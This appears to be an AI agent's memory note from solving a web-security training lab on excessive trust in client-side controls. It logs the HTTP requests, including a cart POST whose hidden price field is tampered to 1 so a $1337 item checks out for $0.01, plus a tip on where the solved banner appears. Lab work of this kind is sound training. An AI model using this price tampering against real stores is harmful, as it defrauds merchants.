---
metadata:
  node_type: memory
name: "PRS arm A lab-logic-flaws-excessive-trust-in-client-side-controls"
description: "Arm A baseline: excessive-trust-in-client-side-controls solved in one pass (tamper cart price=1) - plus the root-banner staleness trap"
last_updated: 2026-10-08T21:18:58+08:00
created: 2026-10-08T21:18:58+08:00
---

Arm A baseline, lab-logic-flaws-excessive-trust-in-client-side-controls, cold instance (reused:false), one pass solved.

Chain (7 HTTP calls, all via pieces):
1. page_read lab page -> widget-lab-id CA187B1F...27E9B (solutions stripped)
2. range_launch launch <hash> --jar /tmp/cj1.json -> instance https://0a52001203e2a72b804bc691009d0078...
3. http_session get /login -> csrf wRkhVwem...
4. http_session post /login csrf+wiener:peter -> 302 /my-account?id=wiener, new session cookie
5. http_session get /product?productId=1 -> form shows hidden price=133700 (cents) for the $1337.00 jacket; store credit $100.00
6. http_session post /cart productId=1&redir=PRODUCT&quantity=1&price=1 -> 302 (server took the client-supplied price)
7. http_session get /cart -> line price $0.01, total $0.01, checkout csrf eK9wdqEB...
8. http_session post /cart/checkout csrf=... -> 303 /cart/order-confirmation?order-confirmed=true
9. get order-confirmation -> banner is-solved + "Congratulations, you solved the lab!"; order table shows jacket $1337.00, total $0.01, credit $99.99

Pitfall: banner_verdict on "/" right after checkout returned solved:false; the solved state was visible on the order-confirmation page (and the banner there). Do not read a root-page banner miss as unsolved - confirm on the page that carries the verdict.

Piece inventory used: page_read, range_launch, http_session, banner_verdict. No new piece needed.

